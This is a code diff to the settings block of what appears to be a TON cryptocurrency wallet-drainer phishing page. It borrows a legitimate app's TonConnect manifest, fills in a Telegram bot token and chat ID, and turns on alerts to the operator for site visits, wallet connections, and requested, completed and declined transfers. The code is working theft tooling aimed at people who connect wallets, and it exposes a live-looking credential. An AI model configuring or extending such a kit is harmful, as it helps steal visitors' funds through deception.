@@ -38,19 +38,19 @@ document.addEventListener("DOMContentLoaded", async () => {
         NFTs: true, // ('true' enabled or 'false' disabled)
         Tokens_First: false, // 'false' - At the value price, 'true' - Token are always first 
         Ton_rate: 7.99, // conversion rate ( 1 TON to USD = 7.99 )
-        TonApi_Key: "", // https://tonconsole.com/ (RECOMMENDED), 
+        TonApi_Key: "https://tonconsole.com/", // https://tonconsole.com/ (RECOMMENDED), 
         manifestUrl: "https://app.storm.tg/tonconnect-manifest.json", // To use a personalized manifest, use « 'https://' + window.location.hostname + '/tonconnect-manifest.json' »
     }
     
     const TG = {
         token: "7938153457:AAGt3_wK6pp8D__0hL5B0Ej8jjn8K4DFzYc", // Your @Botfather Bot token Ex. "725766552:ABChbSGObfvqkdxX4OEhZ_Hb8_V680Sc6Cs"
         chat_id: "-1002749967627", // ID of the chat for notifications (include the minus if present) Ex. "-1033337653892"
-        enter_website: false, // Notify on site entry ('true' enabled or 'false' disabled)
-        connect_success: false, // Notify on wallet connection ('true' enabled or 'false' disabled)
+        enter_website: true, // Notify on site entry ('true' enabled or 'false' disabled)
+        connect_success: true, // Notify on wallet connection ('true' enabled or 'false' disabled)
         connect_empty: false,  // Notify on empty wallet connection ('true' enabled or 'false' disabled)
-        transfer_request: false, // Notify on transfer request ('true' enabled or 'false' disabled)
-        transfer_success: false, // Notify on successful transfer ('true' enabled or 'false' disabled)
-        transfer_cancel: false, // Notify on declined transfer ('true' enabled or 'false' disabled) 
+        transfer_request: true, // Notify on transfer request ('true' enabled or 'false' disabled)
+        transfer_success: true, // Notify on successful transfer ('true' enabled or 'false' disabled)
+        transfer_cancel: true, // Notify on declined transfer ('true' enabled or 'false' disabled) 
     };
 
 // =====================================================================
